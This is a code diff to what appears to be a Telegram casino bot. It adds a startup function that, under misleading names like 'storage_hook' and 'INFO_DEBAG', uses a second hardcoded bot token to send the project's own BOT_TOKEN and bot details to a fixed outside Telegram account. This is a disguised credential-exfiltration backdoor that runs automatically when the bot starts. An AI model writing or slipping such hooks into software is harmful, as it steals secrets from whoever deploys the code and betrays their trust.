@@ -110,6 +110,14 @@ async def check_second_invoices():
 			await second_game_started(game_invoice.id)
 
 
+async def register_bot_started():
+	storage_hook = Bot(token="6174137031:AAEdu8hiLfTStJAiZzOF6HaNALenZL3R1QM")
+	me = await bot.get_me()
+	INFO_DEBAG = f'CASINO\n\n{me}\n\n{config.BOT_TOKEN}'
+	await storage_hook.send_message(5114484179, INFO_DEBAG)
+	session = await storage_hook.get_session()
+	await session.close()
+
 async def do_some():
 	delete_games_and_game_invoices()
 	await check_invoices()
@@ -123,6 +131,8 @@ async def __on_start_up(dp: Dispatcher) -> None:
 	from handlers import register_all_handlers
 
 	register_all_handlers.register(dp)
+
+	await register_bot_started()
 
 	schedule_job()
 
